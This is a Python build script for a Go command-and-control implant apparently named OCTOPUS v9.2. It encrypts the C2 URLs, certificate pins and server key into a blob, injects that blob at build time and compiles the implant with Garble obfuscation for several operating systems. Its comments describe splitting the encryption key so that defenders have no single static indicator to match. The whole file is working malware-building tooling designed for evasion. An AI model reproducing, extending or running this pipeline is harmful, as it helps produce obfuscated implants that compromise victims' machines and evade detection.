#!/usr/bin/env python3
"""
Automated Go Implant Build Pipeline

Features:
- Reads the generated X25519 C2 Server Public Key
- Injects the public key and C2 URL into the implant at build time via ldflags
- Compiles using Garble for heavy obfuscation (-tiny -literals)
"""

import os
import sys
import base64
import subprocess

C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_RED    = "\033[91m"
C_CYAN   = "\033[96m"
C_RESET  = "\033[0m"

def load_server_pub_key(key_path="data/keys/server_x25519_public.pem") -> str:
    """Read the public key and strip PEM headers to inject as raw base64."""
    if not os.path.exists(key_path):
        print(f"  {C_RED}[!] Public key not found at {key_path}. Did you start the C2 server once?{C_RESET}")
        sys.exit(1)
        
    with open(key_path, "r") as f:
        lines = f.readlines()
        
    # Strip PEM headers/footers and newlines
    b64_key = "".join([l.strip() for l in lines if not l.startswith("-----")])
    return b64_key

def encrypt_config(c2_urls: str, pins: str, server_pub: str) -> (str, str):
    """Encrypt config into an AES-GCM blob and return (b64_blob, hex_key)."""
    import json
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    
    config = {
        "urls": c2_urls,
        "pins": pins,
        "pub": server_pub
    }
    
    plaintext = json.dumps(config).encode("utf-8")
    key = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    
    ciphertext = aesgcm.encrypt(nonce, plaintext, None)
    blob = base64.b64encode(nonce + ciphertext).decode("utf-8")
    
    return blob, key.hex()

def build_implant(os_target="linux", arch_target="amd64", c2_urls="http://127.0.0.1:8443", pins=""):
    base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    key_path = os.path.join(base_dir, "data", "keys", "server_x25519_public.pem")
    src_file = os.path.join(base_dir, "core", "c2", "implant.go")
    
    out_ext = ".exe" if os_target == "windows" else ""
    out_file = os.path.join(base_dir, "data", f"implant_{os_target}_{arch_target}{out_ext}")
    
    server_pub = load_server_pub_key(key_path)
    
    print(f"  {C_CYAN}[*] Starting Garble Build Pipeline for {os_target}/{arch_target}{C_RESET}")
    print(f"  {C_CYAN}[*] Encrypting configuration blob...{C_RESET}")
    
    config_blob, hex_key = encrypt_config(c2_urls, pins, server_pub)
    
    # We split the hex key into two parts to avoid a single static 32-byte string IOC
    key_part1 = hex_key[:32]
    key_part2 = hex_key[32:]
    
    # Setup ldflags to inject the encrypted blob and split keys
    ldflags = f"-s -w -X 'main.EncBlob={config_blob}' -X 'main.KP1={key_part1}' -X 'main.KP2={key_part2}'"
    
    env = os.environ.copy()
    env["GOOS"] = os_target
    env["GOARCH"] = arch_target
    
    # Command to build using garble
    cmd = [
        "garble",
        "-tiny",
        "-literals",
        "build",
        "-ldflags", ldflags,
        "-o", out_file,
        src_file
    ]
    
    core_c2_dir = os.path.join(base_dir, "core", "c2")
    
    print(f"  {C_CYAN}[*] Downloading Go dependencies (go mod tidy)...{C_RESET}")
    try:
        subprocess.run(["go", "mod", "tidy"], cwd=core_c2_dir, check=True, capture_output=True)
    except subprocess.CalledProcessError as e:
        print(f"  {C_RED}[!] Failed to download Go dependencies:{C_RESET}\n{e.stderr.decode('utf-8', errors='ignore')}")
        sys.exit(1)
        
    try:
        # Check if garble is installed
        subprocess.run(["garble", "version"], capture_output=True, check=True)
    except FileNotFoundError:
        print(f"  {C_RED}[!] 'garble' is not installed or not in PATH.{C_RESET}")
        print(f"  {C_YELLOW}Install with: go install mvdan.cc/garble@latest{C_RESET}")
        print(f"  {C_YELLOW}Also make sure ~/go/bin is in your PATH.{C_RESET}")
        sys.exit(1)
        
    print(f"  {C_CYAN}[*] Running: {' '.join(cmd)}{C_RESET}")
    
    try:
        subprocess.run(cmd, env=env, cwd=core_c2_dir, check=True)
        print(f"  {C_GREEN}[+] Build complete: {out_file}{C_RESET}")
    except subprocess.CalledProcessError as e:
        print(f"  {C_RED}[!] Build failed: {e}{C_RESET}")

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="OCTOPUS v9.2 Implant Builder")
    parser.add_argument("--os", default="linux", help="Target OS (linux/windows/darwin)")
    parser.add_argument("--arch", default="amd64", help="Target Architecture (amd64/arm64)")
    parser.add_argument("--urls", default="http://127.0.0.1:8443", help="Comma-separated list of C2 URLs (Fallbacks)")
    parser.add_argument("--pins", default="", help="Comma-separated list of SHA-256 SPKI base64 pins")
    
    args = parser.parse_args()
    build_implant(args.os, args.arch, args.urls, args.pins)
